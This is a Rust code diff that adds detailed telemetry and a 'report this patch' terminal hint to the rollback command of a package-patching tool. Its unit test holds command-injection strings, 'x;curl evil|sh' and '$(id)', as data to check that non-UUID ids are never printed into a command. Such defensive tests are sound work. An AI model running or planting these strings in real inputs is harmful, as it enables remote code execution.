@@ -12,7 +12,9 @@ use socket_patch_core::patch::rollback::{
     cannot_rollback_error, rollback_package_patch, verify_file_rollback, RollbackResult,
     VerifyRollbackResult, VerifyRollbackStatus,
 };
-use socket_patch_core::telemetry::{track_patch_rollback_failed, track_patch_rolled_back};
+use socket_patch_core::telemetry::{
+    track_patch_rollback_failed, track_patch_rolled_back, RollbackRun, TelemetryAuth, MODE_AGENT,
+};
 use socket_patch_core::utils::purl::strip_purl_qualifiers;
 use socket_patch_core::utils::purl_key::PurlKey;
 use socket_patch_core::utils::target::{is_path_shaped, Target, TargetKind};
@@ -1589,6 +1591,84 @@ impl BelowNotes {
 /// the patched project directories below it.
 const PROJECTS_NOT_ROLLED_BACK: &str = "projects_not_rolled_back";
 
+/// What a rollback event says about the run itself.
+fn rollback_run(args: &RollbackArgs, rolled_back_count: usize) -> RollbackRun {
+    RollbackRun {
+        rolled_back_count,
+        dry_run: args.common.dry_run,
+        targeted: !args.targets.is_empty(),
+    }
+}
+
+/// Telemetry for a rollback that ended before it reached a patch: a
+/// manifest it could not read, a target that matched nothing. `code` is
+/// the run's `--json` error code, which is what tells a mistyped target
+/// from a patch that would not come off.
+async fn track_unstarted(
+    args: &RollbackArgs,
+    code: &str,
+    error: impl std::fmt::Display,
+    telemetry: &TelemetryAuth,
+) {
+    track_patch_rollback_failed(code, error, rollback_run(args, 0), &[], telemetry).await;
+}
+
+/// The most patches a rollback's report hint names: past this the
+/// command no longer fits a line, and the run was not about one patch.
+const REPORT_HINT_MAX_PATCHES: usize = 3;
+
+/// The line a rollback of a few named patches ends with at a terminal:
+/// the `report` command for the patches it took off, ready to run. A
+/// patch is usually rolled back because it broke something, and by then
+/// the project no longer holds it, so only its UUID still names it.
+///
+/// `None` when the run took off no patch, or more than a line can name,
+/// or one whose recorded id is not a UUID. A manifest's `uuid` is a
+/// string a project file supplies: only a real UUID is ever printed as
+/// part of a command to run, and `report` takes nothing else for a patch
+/// the project no longer holds.
+fn report_hint(patches: &[socket_patch_core::telemetry::PatchOutcome]) -> Option<String> {
+    let mut uuids: Vec<&str> = Vec::new();
+    for patch in patches.iter().filter(|p| p.outcome == "rolled_back") {
+        if !socket_patch_core::utils::target::is_uuid_shaped(&patch.uuid) {
+            return None;
+        }
+        if !uuids.contains(&patch.uuid.as_str()) {
+            uuids.push(&patch.uuid);
+        }
+    }
+    if uuids.is_empty() || uuids.len() > REPORT_HINT_MAX_PATCHES {
+        return None;
+    }
+    Some(format!(
+        "Did {} break something? Tell Socket: socket-patch report {} --message \"what happened\"",
+        if uuids.len() == 1 {
+            "this patch"
+        } else {
+            "one of these patches"
+        },
+        uuids.join(" ")
+    ))
+}
+
+/// The patches a rollback's events name, as its telemetry reports them.
+/// The manifest cleanup's `removed` events are left out: they say a record
+/// was dropped, and the patch's own event already says what happened to
+/// the package.
+fn reported_rollback_patches(env: &Envelope) -> Vec<socket_patch_core::telemetry::PatchOutcome> {
+    crate::telemetry_outcomes::patch_outcomes_of(
+        env.events.iter().filter(|event| {
+            !event
+                .details
+                .as_ref()
+                .and_then(|details| details.get("manifest"))
+                .and_then(serde_json::Value::as_bool)
+                .unwrap_or(false)
+        }),
+        MODE_AGENT,
+    )
+}
+
 pub async fn run(args: RollbackArgs) -> i32 {
     use crate::commands::projects_below::{self, Depth, Work};
     apply_env_toggles(&args.common);
@@ -1830,8 +1910,8 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
     let manifest_missing = match manifest_exists(&manifest_path).await {
         Ok(present) => !present,
         Err(e) => {
-            track_patch_rollback_failed(&e.to_string(), &telemetry).await;
             let err = crate::json_envelope::manifest_load_error(&manifest_path, &e);
+            track_unstarted(&args, &err.code, e.to_string(), &telemetry).await;
             emit_rollback_error(
                 args.common.json,
                 args.common.dry_run,
@@ -1996,7 +2076,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
             Ok(None) => {
                 // Deleted between the existence probe and the read.
                 let msg = format!("Manifest not found at {}", manifest_path.display());
-                track_patch_rollback_failed(&msg, &telemetry).await;
+                track_unstarted(&args, "manifest_not_found", &msg, &telemetry).await;
                 emit_rollback_error(
                     args.common.json,
                     args.common.dry_run,
@@ -2007,7 +2087,13 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
             }
             Err(e) => {
                 let msg = e.to_string();
-                track_patch_rollback_failed(&msg, &telemetry).await;
+                track_unstarted(
+                    &args,
+                    crate::json_envelope::manifest_load_error_code(&e),
+                    &msg,
+                    &telemetry,
+                )
+                .await;
                 if args.common.json {
                     let err = crate::json_envelope::manifest_load_error(&manifest_path, &e);
                     println!(
@@ -2083,7 +2169,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
         if let Ok(state) = &vendor_state_result {
             if let Some(detail) = unledgered_vendor_wiring(&args.common, &ledger_root, state).await
             {
-                track_patch_rollback_failed(&detail, &telemetry).await;
+                track_unstarted(&args, "vendor_ledger_missing", &detail, &telemetry).await;
                 emit_rollback_error(
                     args.common.json,
                     args.common.dry_run,
@@ -2133,7 +2219,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
         let id = match settled {
             Ok(settled) => settled,
             Err(msg) => {
-                track_patch_rollback_failed(&msg, &telemetry).await;
+                track_unstarted(&args, "ambiguous_target", &msg, &telemetry).await;
                 emit_rollback_error(
                     args.common.json,
                     args.common.dry_run,
@@ -2155,7 +2241,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                 format!(" (to target a directory instead, use ./{id} or {id}/**)")
             };
             let msg = format!("No patch found matching identifier: {id}{hint}");
-            track_patch_rollback_failed(&msg, &telemetry).await;
+            track_unstarted(&args, "patch_not_found", &msg, &telemetry).await;
             if args.common.json {
                 let mut env = error_envelope(
                     args.common.dry_run,
@@ -2229,7 +2315,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                  identifier or an unscoped rollback)",
                 unmatched.1
             );
-            track_patch_rollback_failed(&msg, &telemetry).await;
+            track_unstarted(&args, "path_glob_no_match", &msg, &telemetry).await;
             emit_rollback_error(
                 args.common.json,
                 args.common.dry_run,
@@ -2786,6 +2872,34 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                 ));
             }
 
+            // Telemetry names the patches the `--json` envelope's events
+            // name, so the two cannot disagree: the same report, built
+            // without the run-level extras no event of it carries.
+            let reported_patches =
+                reported_rollback_patches(&build_rollback_envelope(&RollbackReport {
+                    dry_run: args.common.dry_run,
+                    success,
+                    manifest: &manifest,
+                    results: &results,
+                    not_installed: &not_installed,
+                    unsupported_skips: &unsupported_skips,
+                    invalid_keys: &invalid_keys,
+                    project_owned: if project_state {
+                        &[]
+                    } else {
+                        &vendored_excluded
+                    },
+                    vendored: &vendored_leg,
+                    vendor_entries: &vendor_entries,
+                    hosted: &hosted_leg,
+                    hosted_pins: &hosted_pins,
+                    contested: contested.as_deref(),
+                    removed: &removed,
+                    gc: None,
+                    warnings: &[],
+                    paths: path_scope.raw(),
+                }));
+
             if args.common.json {
                 // The GC was requested (not `--preserve-state`) but could not
                 // run: `gc` stays absent and this warning says why.
@@ -2999,10 +3113,33 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                 }
             }
 
+            // Someone at a terminal who named the patches to take off is
+            // told how to report them. Never a dry run, `--json`,
+            // `--silent`, a pipe or an agent's terminal.
+            if success
+                && !args.targets.is_empty()
+                && !args.common.dry_run
+                && !args.common.json
+                && !args.common.silent
+                && crate::ui::attended(crate::ui::Stream::Stdout)
+            {
+                if let Some(hint) = report_hint(&reported_patches) {
+                    println!("\n{}", crate::ui::dim(&hint, crate::ui::stdout_color()));
+                }
+            }
+
+            let run = rollback_run(&args, rolled_back_total);
             if success {
-                track_patch_rolled_back(rolled_back_total, &telemetry).await;
+                track_patch_rolled_back(run, &reported_patches, &telemetry).await;
             } else {
-                track_patch_rollback_failed("One or more rollbacks failed", &telemetry).await;
+                track_patch_rollback_failed(
+                    "rollback_failed",
+                    "One or more rollbacks failed",
+                    run,
+                    &reported_patches,
+                    &telemetry,
+                )
+                .await;
             }
 
             if success {
@@ -3012,7 +3149,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
             }
         }
         Err(e) => {
-            track_patch_rollback_failed(&e, &telemetry).await;
+            track_unstarted(&args, "rollback_failed", &e, &telemetry).await;
             if args.common.json {
                 println!(
                     "{}",
@@ -4409,6 +4546,69 @@ async fn rollback_maven_target(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// The report hint names the patches a run took off, each once, and
+    /// stays quiet when there are none or too many to name on a line.
+    #[test]
+    fn report_hint_names_the_patches_taken_off() {
+        use socket_patch_core::telemetry::{PatchOutcome, MODE_HOSTED};
+        const A: &str = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa";
+        const B: &str = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb";
+        let patch = |uuid: &str, mode, outcome| PatchOutcome {
+            uuid: uuid.to_string(),
+            ecosystem: "npm".to_string(),
+            mode,
+            outcome,
+            code: None,
+        };
+        assert_eq!(report_hint(&[]), None);
+        assert_eq!(report_hint(&[patch(A, MODE_AGENT, "skipped")]), None);
+        assert_eq!(
+            report_hint(&[
+                patch(A, MODE_AGENT, "rolled_back"),
+                patch(A, MODE_HOSTED, "rolled_back"),
+                patch(B, MODE_AGENT, "failed"),
+            ]),
+            Some(format!(
+                "Did this patch break something? Tell Socket: socket-patch report {A} \
+                 --message \"what happened\""
+            ))
+        );
+        assert_eq!(
+            report_hint(&[
+                patch(A, MODE_AGENT, "rolled_back"),
+                patch(B, MODE_AGENT, "rolled_back"),
+            ]),
+            Some(format!(
+                "Did one of these patches break something? Tell Socket: socket-patch report \
+                 {A} {B} --message \"what happened\""
+            ))
+        );
+        let many: Vec<PatchOutcome> = (0..4)
+            .map(|n| {
+                patch(
+                    &format!("{n:08x}-aaaa-4aaa-8aaa-aaaaaaaaaaaa"),
+                    MODE_AGENT,
+                    "rolled_back",
+                )
+            })
+            .collect();
+        assert_eq!(report_hint(&many), None);
+
+        // A recorded id is whatever the manifest says. One that is not a
+        // UUID is never printed as part of a command: `report` would not
+        // find it, and it could be anything.
+        for id in ["local-1", "x;curl evil|sh", "$(id)"] {
+            assert_eq!(
+                report_hint(&[
+                    patch(A, MODE_AGENT, "rolled_back"),
+                    patch(id, MODE_AGENT, "rolled_back"),
+                ]),
+                None,
+                "{id}"
+            );
+        }
+    }
     use socket_patch_core::manifest::schema::{PatchManifest, PatchRecord};
     use std::collections::HashMap;
 
